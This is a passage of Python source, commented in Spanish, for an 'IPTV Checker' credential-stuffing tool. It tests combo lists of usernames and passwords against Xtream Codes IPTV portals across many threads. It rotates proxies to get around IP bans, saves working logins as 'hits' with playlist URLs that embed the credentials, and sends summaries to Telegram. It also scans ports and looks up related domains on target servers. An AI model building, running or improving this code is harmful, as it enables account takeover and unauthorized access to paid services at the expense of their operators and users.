        """Guarda la información del hit en un archivo específico para el dominio"""
        try:
            domain = self.portal.split(':')[0]
            if ":" in domain:
                domain = domain.replace(":", "_")

            if not os.path.exists('hits'):
                os.makedirs('hits')

            timestamp = datetime.now().strftime("%Y%m%d")
            filename = f"hits/HITS_{domain}.txt"

            user = hit_data['user']
            password = hit_data['pass']
            expire = hit_data.get('expire', 'No expira')
            active_cons = hit_data.get('active_cons', '0')
            max_cons = hit_data.get('max_cons', '0')
            status = hit_data.get('user_info', {}).get('status', 'Unknown')

            message = f"""╭➤ 𝗛𝗶𝘁𝘀 ʙʏ ★彡【ＪＣ】彡★
    ├●🌐 Host ➤ http://{self.portal}
    ├●👤 User ➤ {user}
    ├●🔑 Pass ➤ {password}
    ├●📆 Exp.  ➤ {expire}
    ├●👥 Act Con   ➤ {active_cons}
    ├●👪 Max Con ➤ {max_cons}
    ├●⚡ Status     ➤ {status}
    ╰─➤ 𝗛𝗶𝘁𝘀 ʙʏ ★彡【ＪＣ】彡★"""

            live_count = hit_data.get('live_count', '')
            vod_count = hit_data.get('vod_count', '')
            series_count = hit_data.get('series_count', '')

            if live_count or vod_count or series_count:
                message += f"""
    ╭● 🎬 En Vivo    ➤ {live_count}
    ├● 🎬 Películas ➤ {vod_count}
    ├● 🎬 Series      ➤ {series_count}
    ╰─────────────── •"""

            message += f"\n●🔗m3u_Url➤http://{self.portal}/get.php?username={user}&password={password}&type=m3u_plus"

            categories = hit_data.get('categories', '')
            if categories:
                message += "\n╭➤Categorías en Vivo➤\n"
                for cat in categories.split('🔹')[1:]:
                    if cat.strip():
                        message += f"├●{cat.strip()}\n"
                message += f"╰──{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}── •"

            message += "\n" + "="*50 + "\n"

            with open(filename, 'a', encoding='utf-8') as f:
                f.write(message)

            return True
        except Exception as e:
            logger.error(f"Error guardando hit en archivo: {e}")
            return False

    def _display_thread(self):
        """Hilo para actualizar la pantalla con el progreso optimizado"""
        last_update = 0
        last_location_check = 0
        timeout_counter = 0
        max_timeout_cycles = 300  

        while self.running:
            current_time = time.time()

            if current_time - last_update < self.update_interval:
                timeout_counter += 1
                if timeout_counter > max_timeout_cycles:
                    logger.warning("Display thread terminando por timeout - sin actividad")
                    break
                time.sleep(0.1)
                continue

            timeout_counter = 0  
            last_update = current_time

            self._update_display()

            if hasattr(self, 'proxy_manager') and self.proxy_manager and self.proxy_manager.enabled:
                time_since_rotation = current_time - self.last_proxy_rotation
                if time_since_rotation >= self.proxy_rotation_interval:
                    try:
                        if len(self.proxy_manager.active_proxies) > 1:
                            old_proxy = self.current_proxy
                            self.proxy_manager._force_time_rotation()
                            new_proxy = self.proxy_manager.get_proxy()
                            self.current_proxy = new_proxy
                            self.last_proxy_rotation = current_time
                            logger.warning(f"[ROTATE] ROTACION FORZADA: {time_since_rotation:.1f}s transcurridos")
                    except Exception as e:
                        logger.error(f"Error en rotación forzada: {e}")

            if freeze_detector.check_progress_stall(self.stats['checked']):
                logger.warning("=== CONGELAMIENTO DETECTADO ===")
                if freeze_detector.trigger_recovery(self):
                    logger.info("Recuperación automática activada")
                else:
                    logger.error("Recuperación automática falló")

            if current_time - last_location_check > 60:
                self._update_location()
                last_location_check = current_time

            time.sleep(0.1)

    def _update_location(self):
        """Actualiza la información de ubicación"""
        try:
            new_location = geo_manager.get_location()
            if new_location != self.location:
                logger.info(f"Ubicación actualizada: {new_location}")
                self.location = new_location
        except Exception as e:
            logger.error(f"Error actualizando ubicación: {e}")

    def _restart_stalled_threads(self):
        """Reinicia threads que se han detenido para recuperación de emergencia"""
        try:
            logger.warning("INICIANDO REINICIO DE THREADS DETENIDOS")

            active_threads = [t for t in self.threads if t.is_alive()]
            expected_threads = self.thread_count

            logger.info(f"Threads activos: {len(active_threads)}/{expected_threads}")

            if len(active_threads) < expected_threads:
                threads_to_create = expected_threads - len(active_threads)
                logger.warning(f"Creando {threads_to_create} threads de reemplazo")

                for i in range(threads_to_create):
                    thread = threading.Thread(target=self._worker_thread, name=f"RecoveryWorker-{i}")
                    thread.daemon = True
                    thread.start()
                    self.threads.append(thread)
                    logger.info(f"Thread de recuperación iniciado: {thread.name}")

            pending_tasks = self.task_queue.qsize()
            if pending_tasks > 0:
                logger.info(f"Tasks pendientes en cola: {pending_tasks}")

            logger.info("Reinicio de threads completado")

        except Exception as e:
            logger.error(f"Error reiniciando threads: {e}")

    def _update_display(self):
        """Actualiza la interfaz de línea de comandos optimizada"""
        try:

            if not self.screen_lock.acquire(timeout=2.0):
                logger.warning("Display update saltado - screen_lock timeout")
                return

            try:

                if hasattr(self, 'categories') and self.categories and self.stats.get('hits', 0) > 0:
                    logger.debug(f"Mostrando categorías en display: {len(self.categories)} caracteres")

                self._update_window_title()

                sys.stdout.write("\033[2J\033[H")

                self._print_header()

                if hasattr(self, 'ip_banned') and self.ip_banned:
                    sys.stdout.write(f"\033[5;0H{Colors.RED}{Colors.BOLD}{'═' * 80}{Colors.RESET}\033[K\n")
                    sys.stdout.write(f"\033[6;0H{Colors.RED}{Colors.BOLD}{self.ip_banned_message:^80}{Colors.RESET}\033[K\n")
                    sys.stdout.write(f"\033[7;0H{Colors.RED}{Colors.BOLD}{'═' * 80}{Colors.RESET}\033[K\n")
                    stats_start_line = 8  
                else:
                    stats_start_line = 5  

                self._print_stats(start_line=stats_start_line)
                self._print_progress_bar(start_line=stats_start_line)
                self._print_proxy_info(start_line=stats_start_line)
                self._print_combo_info(start_line=stats_start_line)
                self._print_hits(start_line=stats_start_line)
                self._print_content_stats(start_line=stats_start_line)
                self._print_retry_stats()  

                sys.stdout.flush()  

            finally:

                self.screen_lock.release()

        except Exception as e:
            logger.error(f"Error actualizando pantalla: {e}")

    def _update_window_title(self):
        """Actualiza el título de la ventana con estadísticas"""
        try:
            device_type = detect_device_type()

            if device_type == 'pc':

                title = f"IPTV Checker by JC v5.7 .1 - Hits {self.stats['hits']} Fails {self.stats['fails']} Retries {self.stats['retries']} Custom {self.stats['custom']}"
                set_window_title(title)
        except Exception as e:
            logger.debug(f"Error actualizando título: {e}")

    def _print_header(self):
        """Imprime el encabezado con información básica"""
        current_time = datetime.now().strftime("%Y-%m-%d -- %H:%M:%S")

        def write_line(y, text):
            sys.stdout.write(f"\033[{y};0H{text}\033[K")

        write_line(1, f"{Colors.CYAN}{'▂▃▅▇█▓▒░ IPTV Checker v5.7 by J_C ░▒▓█▇▅▃▂':^56}{Colors.RESET}")
        write_line(2, f"{Colors.WHITE}----------------- {current_time} -----------------{Colors.RESET}")
        write_line(3, f"{Colors.WHITE} Ubicación actual: {Colors.YELLOW}{self.location}{Colors.RESET}")
        write_line(4, f"{Colors.WHITE} Host : {Colors.YELLOW}{self.portal}{Colors.RESET}")

    def _print_stats(self, start_line=2):
        """Imprime estadísticas detalladas con cálculo correcto de CPM y progreso
        NOTA IMPORTANTE: 
        - 'checked' = hits + fails + custom (cuentas procesadas definitivamente)
        - 'retries' NO se cuentan en 'checked', solo se reencolan
        - 'remaining' = cuentas pendientes por procesar (se actualiza dinámicamente)
        """
        def write_line(y, text):
            sys.stdout.write(f"\033[{y};0H{text}\033[K")

        elapsed_minutes = max(0.01, (time.time() - self.start_time) / 60)

        cpm = int(self.stats['checked_this_session'] / elapsed_minutes)

        remaining = max(0, self.stats['total'] - self.stats['checked'])

        self.stats['remaining'] = remaining

        total = format(self.stats['total'], ",d")  
        remaining_formatted = format(remaining, ",d")  
        checked = format(self.stats['checked'], ",d")  
        hits = format(self.stats['hits'], ",d")
        fails = format(self.stats['fails'], ",d")
        custom = format(self.stats['custom'], ",d")
        retries = format(self.stats['retries'], ",d")  
        cpm_str = format(cpm, ",d")

        proxy_str = "Sin proxy"
        proxy_color = Colors.RED

        if proxy_manager and proxy_manager.enabled and proxy_manager.active_proxies:
            if self.current_proxy:
                proxy_str = proxy_manager._proxy_to_str(self.current_proxy)
            elif len(proxy_manager.active_proxies) > 0:

                sample_proxy = proxy_manager.active_proxies[0]
                proxy_str = proxy_manager._proxy_to_str(sample_proxy)

            if proxy_str and proxy_str != "Sin proxy":
                max_len = get_terminal_width() - 20
                if len(proxy_str) > max_len:
                    proxy_str = proxy_str[:max_len-3] + "..."
                proxy_color = Colors.GREEN

        write_line(start_line, f"{Colors.WHITE} Proxy: {proxy_color}{proxy_str}{Colors.RESET}")

        write_line(start_line + 1, f"{Colors.WHITE} Combo: {Colors.MAGENTA}{self.current_user}:{self.current_pass}{Colors.RESET}")

        stats_line = f"{Colors.WHITE} Hits : {Colors.CYAN}{hits}{Colors.RESET}"
        stats_line += f" Retries: {Colors.MAGENTA}{retries}{Colors.RESET}"
        stats_line += f" Custom: {Colors.YELLOW}{custom}{Colors.RESET}"
        stats_line += f" Fails: {Colors.RED}{fails}{Colors.RESET}"
        write_line(start_line + 2, stats_line)

        progress_line = f"{Colors.WHITE} Bots: {Colors.YELLOW}{self.thread_count}{Colors.RESET}"
        progress_line += f" Checked: {Colors.YELLOW}{checked}{Colors.RESET}"
        progress_line += f" de {Colors.YELLOW}{total}{Colors.RESET}"
        progress_line += f" CPM: {Colors.YELLOW}{cpm_str}{Colors.RESET}"
        write_line(start_line + 3, progress_line)

    def _print_progress_bar(self, start_line=2):
        """Imprime la barra de progreso basada en el progreso total acumulado"""
        def write_line(y, text):
            sys.stdout.write(f"\033[{y};0H{text}\033[K")

        if self.stats['total'] > 0:
            progress = min(1.0, self.stats['checked'] / self.stats['total'])
        else:
            progress = 1.0  

        terminal_width = get_terminal_width()
        bar_length = max(20, terminal_width - 40)

        block = int(bar_length * progress)
        block = min(block, bar_length)
        bar = "■" * block + "□" * (bar_length - block)

        start_time_str = datetime.fromtimestamp(self.start_time).strftime("%H:%M:%S")
        elapsed = time.time() - self.start_time
        elapsed_str = f"{int(elapsed // 3600):02d}:{int((elapsed % 3600) // 60):02d}:{int(elapsed % 60):02d}"

        percentage = min(100.0, progress * 100)

        write_line(start_line + 4, f"{Colors.CYAN} Hora inicio: {start_time_str} | Transcurrido: {elapsed_str}{Colors.RESET}")
        write_line(start_line + 5, f"{Colors.WHITE} Progreso: [{Colors.GREEN}{bar}{Colors.WHITE}] {percentage:.2f}%{Colors.RESET}")

    def _print_proxy_info(self, start_line=2):
        """Imprime información mejorada sobre proxies"""
        def write_line(y, text):
            sys.stdout.write(f"\033[{y};0H{text}\033[K")

        current_proxy_manager = None
        total_proxies = 0

        if proxy_manager and proxy_manager.enabled:
            current_proxy_manager = proxy_manager
            total_proxies = len(proxy_manager.active_proxies) if proxy_manager.active_proxies else 0
        elif hasattr(self, 'proxy_manager') and self.proxy_manager and self.proxy_manager.enabled:
            current_proxy_manager = self.proxy_manager
            total_proxies = len(self.proxy_manager.active_proxies) if self.proxy_manager.active_proxies else 0
            logger.warning(f"⚠️ Usando self.proxy_manager: {total_proxies} proxies activos")

        if current_proxy_manager:
            proxy_stats = f"{Colors.CYAN}Proxies: Total {total_proxies}{Colors.RESET}"

            if total_proxies > 0:
                good_proxies = len(current_proxy_manager.good_proxies) if hasattr(current_proxy_manager, 'good_proxies') else 0
                proxy_stats += f" | {Colors.GREEN}Buenos {good_proxies}{Colors.RESET}"
                proxy_stats += f" | {Colors.YELLOW}Activos{Colors.RESET}"

            write_line(start_line + 6, proxy_stats)
        else:
            logger.warning("[X] NO SE ENCONTRO PROXY MANAGER VALIDO")
            write_line(start_line + 6, f"{Colors.RED}Sin proxies cargados{Colors.RESET}")

    def _print_hits(self, start_line=2):
        """Imprime tabla de hits encontrados"""
        def write_line(y, text):
            sys.stdout.write(f"\033[{y};0H{text}\033[K")

        MAX_HITDATA_LINES = 10

        if self.hit_data:
            write_line(start_line + 8, f"{Colors.GREEN}{'----- Hits obtenidos -----':^60}{Colors.RESET}")
            table_titulo = f"| {'User':^12} | {'Pass':^12} | {'Expire':^10} | {'Act':^4} | {'Max':^5} |"
            write_line(start_line + 9, f"{Colors.WHITE}-----------------------------------------------------------{Colors.RESET}")
            write_line(start_line + 10, f"{Colors.YELLOW}{table_titulo}{Colors.RESET}")

            hitdata_lines = self.hit_data.split('\n')[-MAX_HITDATA_LINES:]
            for i, line in enumerate(hitdata_lines):
                if line.strip():
                    write_line(start_line + 11 + i, f"{Colors.GREEN}{line}{Colors.RESET}")

            write_line(start_line + 21, f"{Colors.WHITE}-----------------------------------------------------------{Colors.RESET}")

    def _print_content_stats(self, start_line=2):
        """Imprime estadísticas de contenido con información de cache"""
        def write_line(y, text):
            sys.stdout.write(f"\033[{y};0H{text}\033[K")

        for i in range(start_line + 22, start_line + 35):
            write_line(i, "")

        if self.stats['hits'] > 0:

            live_display = self.global_live_count or self.live_count or '?'
            vod_display = self.global_vod_count or self.vod_count or '?'
            series_display = self.global_series_count or self.series_count or '?'

            cache_indicator = "📋" if self.global_live_count is not None else ""
            content_stats = f"{Colors.CYAN}EnVivo: {Colors.YELLOW}{live_display}"
            content_stats += f"{Colors.CYAN} Películas: {Colors.YELLOW}{vod_display}"
            content_stats += f"{Colors.CYAN} Series: {Colors.YELLOW}{series_display} {cache_indicator}{Colors.RESET}"
            write_line(start_line + 22, content_stats)

            categories_display = self.global_categories or self.categories
            if categories_display and categories_display.strip():
                write_line(start_line + 23, f"{Colors.CYAN}Categorías del servidor: {cache_indicator}{Colors.RESET}")

                terminal_width = get_terminal_width()
                max_width = terminal_width - 5

                category_lines = categories_display.split('\n')
                display_lines = []

                for line in category_lines[:8]:
                    if line.strip():
                        if len(line) > max_width:
                            line = line[:max_width-3] + "..."
                        display_lines.append(line)

                for i, line in enumerate(display_lines):
                    if i < 10:
                        write_line(start_line + 24 + i, f"{Colors.YELLOW}{line}{Colors.RESET}")

                total_categories = len([l for l in category_lines if l.strip()])
                if total_categories > len(display_lines):
                    write_line(start_line + 24 + len(display_lines), f"{Colors.YELLOW}... y {total_categories - len(display_lines)} categorías más{Colors.RESET}")

    def _show_final_summary(self):
        """Muestra el resumen final optimizado"""
        clear_screen()

        elapsed = time.time() - self.start_time
        elapsed_str = f"{int(elapsed // 3600):02d}:{int((elapsed % 3600) // 60):02d}:{int(elapsed % 60):02d}"

        elapsed_minutes = max(0.01, elapsed / 60)
        cpm = int(self.stats['checked'] / elapsed_minutes)

        print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*50}")
        print(f"           RESUMEN DE VERIFICACIÓN")
        print(f"{'='*50}{Colors.RESET}")

        print(f"\n{Colors.WHITE}Portal: {Colors.YELLOW}{self.protocol}://{self.portal}{Colors.RESET}")
        print(f"{Colors.WHITE}Combo: {Colors.YELLOW}{os.path.basename(self.combo_file)}{Colors.RESET}")
        print(f"{Colors.WHITE}Fecha/Hora: {Colors.YELLOW}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.RESET}")
        print(f"{Colors.WHITE}Tiempo transcurrido: {Colors.YELLOW}{elapsed_str}{Colors.RESET}")
        print(f"{Colors.WHITE}Velocidad promedio: {Colors.YELLOW}{cpm} CPM{Colors.RESET}")

        if proxy_manager.enabled:
            print(f"{Colors.WHITE}Proxies utilizados: {Colors.YELLOW}{len(proxy_manager.active_proxies)}{Colors.RESET}")
            proxy_stats = proxy_manager.get_proxy_stats_str()
            print(f"{Colors.WHITE}{proxy_stats}{Colors.RESET}")

        print(f"\n{Colors.CYAN}{Colors.BOLD}Estadísticas:{Colors.RESET}")
        print(f"┌{'─'*10}┬{'─'*10}┬{'─'*10}┬{'─'*10}┬{'─'*10}┐")
        print(f"│ {'Total':^8} │ {'Hits':^8} │ {'Fails':^8} │ {'Custom':^8} │ {'Retries':^8} │")
        print(f"├{'─'*10}┼{'─'*10}┼{'─'*10}┼{'─'*10}┼{'─'*10}┤")
        print(f"│ {Colors.WHITE}{self.stats['checked']:^8}{Colors.RESET} │ {Colors.GREEN}{self.stats['hits']:^8}{Colors.RESET} │ {Colors.RED}{self.stats['fails']:^8}{Colors.RESET} │ {Colors.YELLOW}{self.stats['custom']:^8}{Colors.RESET} │ {Colors.MAGENTA}{self.stats['retries']:^8}{Colors.RESET} │")
        print(f"└{'─'*10}┴{'─'*10}┴{'─'*10}┴{'─'*10}┴{'─'*10}┘")

        if self.stats['hits'] > 0:
            print(f"\n{Colors.GREEN}{Colors.BOLD}¡{self.stats['hits']} hits encontrados!{Colors.RESET}")
            print(f"{Colors.WHITE}Los resultados se han guardado en la carpeta 'hits'{Colors.RESET}")

        print(f"\n{Colors.CYAN}{Colors.BOLD}¡Verificación completada con sistema optimizado!{Colors.RESET}")

        stats_data = {
            'portal': f"{self.protocol}://{self.portal}",
            'combo_file': self.combo_file,
            'duration': elapsed,
            'cpm': cpm,
            'hits': self.stats['hits'],
            'fails': self.stats['fails'],
            'custom': self.stats['custom'],
            'retries': self.stats['retries'],
            'checked': self.stats['checked'],
            'threads': self.thread_count,
            'proxies_enabled': proxy_manager.enabled,
            'categories_enabled': self.get_categories,
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }

        if telegram_manager.enabled:
            print(f"{Colors.CYAN}Enviando resumen a Telegram...{Colors.RESET}")
            if telegram_manager.send_summary(stats_data):
                print(f"{Colors.GREEN}Resumen enviado correctamente a Telegram.{Colors.RESET}")
            else:
                print(f"{Colors.RED}No se pudo enviar el resumen a Telegram.{Colors.RESET}")

    def _save_results(self):
        """Guarda los resultados finales en archivos"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

        if not os.path.exists('hits'):
            os.makedirs('hits')

        if self.results:
            hits_file = f"hits/hits_{timestamp}.json"
            with open(hits_file, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, indent=4, default=str)

            logger.info(f"Resultados guardados en {hits_file}")

        if self.retries_text:
            retries_file = f"hits/retries_{timestamp}.txt"
            with open(retries_file, 'w', encoding='utf-8') as f:
                f.write(self.retries_text)

            logger.info(f"Reintentos guardados en {retries_file}")

        stats_file = f"hits/stats_{timestamp}.json"
        stats_data = {
            'portal': self.portal,
            'protocol': self.protocol,
            'combo_file': self.combo_file,
            'total': self.stats['total'],
            'checked': self.stats['checked'],
            'hits': self.stats['hits'],
            'fails': self.stats['fails'],
            'custom': self.stats['custom'],
            'retries': self.stats['retries'],
            'duration': time.time() - self.start_time,
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'threads': self.thread_count,
            'proxies_enabled': proxy_manager.enabled,
            'categories_enabled': self.get_categories,
            'proxy_performance': {
                'total_proxies': len(proxy_manager.active_proxies) if proxy_manager.enabled else 0,
                'good_proxies': len(proxy_manager.good_proxies) if proxy_manager.enabled else 0,
                'bad_proxies': len(proxy_manager.bad_proxies) if proxy_manager.enabled else 0
            }
        }

        with open(stats_file, 'w', encoding='utf-8') as f:
            json.dump(stats_data, f, indent=4)

        logger.info(f"Estadísticas guardadas en {stats_file}")

class ResponseCache:
    """Cache para respuestas HTTP optimizado para reducir solicitudes repetidas"""

    def __init__(self, max_size=2000):
        self.cache = {}
        self.max_size = max_size
        self.lock = threading.RLock()
        self.access_count = {}  

    def get(self, url):
        """Obtiene una respuesta cacheada si existe"""
        with self.lock:
            if url in self.cache:
                self.access_count[url] = self.access_count.get(url, 0) + 1
                return self.cache[url]
        return None

    def set(self, url, response):
        """Guarda una respuesta en cache con estrategia LRU"""
        with self.lock:

            if len(self.cache) >= self.max_size:

                sorted_items = sorted(self.access_count.items(), key=lambda x: x[1])
                keys_to_remove = [item[0] for item in sorted_items[:self.max_size // 4]]

                for key in keys_to_remove:
                    if key in self.cache:
                        del self.cache[key]
                    if key in self.access_count:
                        del self.access_count[key]

            self.cache[url] = response
            self.access_count[url] = 1

class ServerAnalyzer:
    """Analiza servidores IPTV para obtener información detallada"""

    def __init__(self):
        self.server_info = {}

    def analyze(self, domain):
        """Realiza un análisis completo del servidor con paralelización"""
        print(f"\n{Colors.CYAN}Analizando servidor {domain} con sistema optimizado...{Colors.RESET}")

        widgets = [
            f'{Colors.GREEN}Progreso: {Colors.RESET}',
            progressbar.Percentage(),
            ' ',
            progressbar.Bar(marker=f'{Colors.GREEN}█{Colors.RESET}'),
            ' ',
            progressbar.ETA()
        ]

        bar = progressbar.ProgressBar(widgets=widgets, max_value=5).start()

        try:

            with ThreadPoolExecutor(max_workers=5) as executor:

                future_ip = executor.submit(self._resolve_ip, domain)
                future_ports = executor.submit(self._check_ports_parallel, domain)

                ip_address = future_ip.result()
                self.server_info['domain'] = domain
                self.server_info['ip'] = ip_address
                bar.update(1)

                future_location = executor.submit(self._get_location_info, ip_address)
                future_domains = executor.submit(self._get_associated_domains, ip_address)

                ports_info = future_ports.result()
                self.server_info['ports'] = ports_info
                bar.update(2)

                future_iptv = executor.submit(self._check_iptv_server_fast, domain, ports_info)

                location_info = future_location.result()
                self.server_info.update(location_info)
                bar.update(3)

                iptv_info = future_iptv.result()
                self.server_info.update(iptv_info)
                bar.update(4)

                domains = future_domains.result()
                self.server_info['related_domains'] = domains
                bar.update(5)

            bar.finish()

            self._display_results()

            return self.server_info

        except Exception as e:
            bar.finish()
            logger.error(f"Error analizando servidor: {e}")
            print(f"\n{Colors.RED}Error al analizar el servidor: {str(e)}{Colors.RESET}")
            return None

    def _resolve_ip(self, domain):
        """Resuelve la IP de un dominio"""
        try:
            ip = socket.gethostbyname(domain)
            print(f"{Colors.GREEN}IP resuelto: {ip}{Colors.RESET}")
            return ip
        except Exception as e:
            logger.error(f"Error resolviendo IP: {e}")
            raise Exception(f"No se pudo resolver la IP para {domain}")

    def _get_location_info(self, ip):
        """Obtiene información de geolocalización optimizada"""
        info = {
            'country': 'Desconocido',
            'isp': 'Desconocido',
            'location': 'Desconocido',
            'timezone': 'Desconocido'
        }

        try:

            api_url = f'http://ip-api.com/json/{ip}?fields=status,country,countryCode,isp,timezone'
            response = requests.get(api_url, timeout=10)

            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    info['country'] = data.get('country', 'Desconocido')
                    info['isp'] = data.get('isp', 'Desconocido')
                    info['timezone'] = data.get('timezone', 'Desconocido')

                    country_code = data.get('countryCode', '')
                    if flag and country_code:
                        try:
                            flag_emoji = flag.flag(country_code)
                            info['location'] = f"{data.get('country', 'Desconocido')} {flag_emoji}"
                        except:
                            info['location'] = data.get('country', 'Desconocido')
                    else:
                        info['location'] = data.get('country', 'Desconocido')
        except Exception as e:
            logger.debug(f"Error obteniendo información de localización: {e}")

        return info

    def _check_ports_parallel(self, domain):
        """Verifica puertos comunes usando verificación paralela"""
        common_ports = [80, 8080, 25461, 2086, 8800, 8008, 443, 9999, 2095, 2083]
        results = {}

        def check_single_port(port):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)  
            try:
                result = sock.connect_ex((domain, port))
                return port, result == 0
            except:
                return port, False
            finally:
                sock.close()

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(check_single_port, port) for port in common_ports]

            for future in concurrent.futures.as_completed(futures):
                port, is_open = future.result()
                results[port] = is_open

        return results

    def _check_iptv_server_fast(self, domain, ports_info):
        """Verifica servicio IPTV de forma optimizada"""
        info = {
            'is_iptv': False,
            'xtream_codes': False,
            'server_type': 'Desconocido',
            'server_version': 'Desconocido'
        }

        test_ports = [port for port, is_open in ports_info.items() if is_open]
        if not test_ports:
            return info

        def test_iptv_port(port):
            try:
                test_url = f"http://{domain}:{port}/player_api.php?username=test&password=test"

                response = requests.get(test_url, timeout=2, verify=False)

                if response.status_code == 200:
                    response_text = response.text.lower()
                    if any(keyword in response_text for keyword in ['user_info', 'incorrect_user', 'auth', 'exp_date']):
                        server_header = response.headers.get('Server', '')
                        return {
                            'is_iptv': True,
                            'xtream_codes': True,
                            'server_type': 'Xtream Codes',
                            'server_version': server_header if server_header else 'Desconocido',
                            'port': port
                        }
            except:
                pass
            return None

        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(test_iptv_port, port) for port in test_ports[:5]]  

            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    return result

        return info

    def _get_associated_domains(self, ip):
        """Obtiene dominios asociados de forma optimizada"""
        domains = []

        try:

            url = f"https://api.hackertarget.com/reverseiplookup/?q={ip}"
            response = requests.get(url, timeout=2)

            if response.status_code == 200 and "No records found" not in response.text:
                raw_domains = response.text.split('\n')

                for domain in raw_domains[:20]:  
                    domain = domain.strip()
                    if domain and domain != "API count exceeded" and '.' in domain:
                        domains.append(domain)
        except Exception as e:
            logger.debug(f"Error obteniendo dominios asociados: {e}")

        return domains

    def _display_results(self):
        """Muestra los resultados del análisis de forma optimizada"""
        print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*60}")
        print(f"      ANÁLISIS DEL SERVIDOR {self.server_info['domain']}")
        print(f"{'='*60}{Colors.RESET}\n")

        print(f"{Colors.YELLOW}Información Básica:{Colors.RESET}")
        print(f"  {Colors.WHITE}Dominio: {Colors.GREEN}{self.server_info['domain']}{Colors.RESET}")
        print(f"  {Colors.WHITE}IP: {Colors.GREEN}{self.server_info['ip']}{Colors.RESET}")
        print(f"  {Colors.WHITE}Ubicación: {Colors.GREEN}{self.server_info['location']}{Colors.RESET}")
        print(f"  {Colors.WHITE}ISP: {Colors.GREEN}{self.server_info['isp']}{Colors.RESET}")
        print(f"  {Colors.WHITE}Zona Horaria: {Colors.GREEN}{self.server_info['timezone']}{Colors.RESET}")

        print(f"\n{Colors.YELLOW}Puertos Detectados:{Colors.RESET}")
        ports = self.server_info['ports']
        open_ports = [port for port, is_open in ports.items() if is_open]

        if open_ports:
            ports_str = ", ".join(map(str, sorted(open_ports)))
            print(f"  {Colors.GREEN}Puertos abiertos: {ports_str}{Colors.RESET}")
        else:
            print(f"  {Colors.RED}No se detectaron puertos abiertos en el escaneo.{Colors.RESET}")

        print(f"\n{Colors.YELLOW}Análisis de Servicio IPTV:{Colors.RESET}")
        if self.server_info.get('is_iptv', False):
            print(f"  {Colors.GREEN}[OK] Servidor IPTV detectado{Colors.RESET}")
            print(f"  {Colors.WHITE}Tipo: {Colors.GREEN}{self.server_info.get('server_type', 'Desconocido')}{Colors.RESET}")
            if 'port' in self.server_info:
                print(f"  {Colors.WHITE}Puerto de servicio: {Colors.GREEN}{self.server_info['port']}{Colors.RESET}")
            if self.server_info.get('server_version') != 'Desconocido':
                print(f"  {Colors.WHITE}Servidor: {Colors.GREEN}{self.server_info.get('server_version')}{Colors.RESET}")
        else:
            print(f"  {Colors.RED}[FAIL] No se detecto servicio IPTV activo{Colors.RESET}")

        domains = self.server_info.get('related_domains', [])
        if domains:
            print(f"\n{Colors.YELLOW}Dominios Relacionados (Top 10):{Colors.RESET}")
            for domain in domains[:10]:
                print(f"  {Colors.GREEN}• {domain}{Colors.RESET}")

            if len(domains) > 10:
                print(f"  {Colors.YELLOW}... y {len(domains) - 10} dominios más{Colors.RESET}")

        print(f"\n{Colors.CYAN}{Colors.BOLD}Análisis completado con sistema optimizado.{Colors.RESET}")

logger = None
telegram_manager = None
http_manager = None
geo_manager = None
proxy_manager = None
response_cache = None

def initialize_managers():
    """Inicializa todos los managers globales"""
    global logger, telegram_manager, http_manager, geo_manager, proxy_manager, response_cache, ua

    try:
        logger = setup_logger()

        try:
            ua = UserAgent()
            logger.info("UserAgent inicializado correctamente")
        except Exception as e:
            logger.warning(f"Error inicializando UserAgent: {e}")
            ua = None

        telegram_manager = TelegramManager()
        http_manager = HTTPSessionManager()
        geo_manager = GeoLocationManager()
        proxy_manager = ProxyManager()
        response_cache = ResponseCache()

        device_type = detect_device_type()
        if device_type == 'pc':
            set_window_title("IPTV Checker by JC v5.7 - Iniciando...")
        else:
            set_window_title("IPTV Checker by JC v5.7")

        return True
    except Exception as e:
        print(f"{Colors.RED}Error inicializando managers: {e}{Colors.RESET}")
        return False

def show_menu():
    """Muestra el menú principal de opciones"""
    clear_screen()
    print_banner()

    print(f"{Colors.CYAN}Seleccione una opción:{Colors.RESET}")
    print(f"{Colors.YELLOW}1. Verificar cuentas {Colors.RESET}")
    print(f"{Colors.YELLOW}2. Generar combo{Colors.RESET}")
    print(f"{Colors.YELLOW}3. Verificar proxies{Colors.RESET}")
    print(f"{Colors.YELLOW}4. Analizar servidor{Colors.RESET}")
    print(f"{Colors.YELLOW}5. Configuración{Colors.RESET}")
    print(f"{Colors.YELLOW}6. Estadísticas de proxies{Colors.RESET}")
    print(f"{Colors.YELLOW}7. Limpiar archivos de proxies (remover puertos problemáticos){Colors.RESET}")
    print(f"{Colors.YELLOW}0. Salir{Colors.RESET}")

    try:
        option = int(input(f"\n{Colors.GREEN}Elija una opción: {Colors.RESET}"))
        return option
    except:
        return -1

def verify_accounts():
    """Ejecuta el verificador de cuentas IPTV optimizado"""
    clear_screen()
    print_banner()

    print(f"{Colors.CYAN}VERIFICADOR DE CUENTAS IPTV{Colors.RESET}")

    checkpoint_file = check_for_checkpoints()

    if checkpoint_file:
        print(f"\n{Colors.CYAN}{'='*70}{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}OPCIONES DE REANUDACIÓN{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*70}{Colors.RESET}\n")
        print(f"{Colors.YELLOW}[1] Continuar desde donde quedó (mantiene stats y posición){Colors.RESET}")
        print(f"{Colors.YELLOW}[2] Empezar desde el principio (solo mantiene configuración){Colors.RESET}")
        print(f"{Colors.YELLOW}[0] Cancelar y volver al menú{Colors.RESET}\n")

        resume_choice = input(f"{Colors.GREEN}Seleccione una opción [0-2]: {Colors.RESET}")

        try:
            resume_choice = int(resume_choice)
        except ValueError:
            resume_choice = 0

        if resume_choice == 0:
            print(f"\n{Colors.YELLOW}Operación cancelada. Volviendo al menú principal.{Colors.RESET}")
            time.sleep(2)
            return

        reset_stats = (resume_choice == 2)

        if reset_stats:
